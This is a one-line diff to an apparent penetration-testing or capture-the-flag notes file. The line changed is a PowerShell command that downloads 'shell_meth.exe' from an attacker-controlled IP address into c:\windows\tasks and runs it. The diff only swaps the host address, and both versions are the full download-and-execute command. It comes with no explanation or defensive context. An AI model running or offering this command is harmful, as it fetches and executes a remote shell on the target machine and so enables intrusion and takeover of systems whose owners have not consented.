@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe') && c:\windows\\tasks\meth.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe') && c:\windows\\tasks\meth.exe
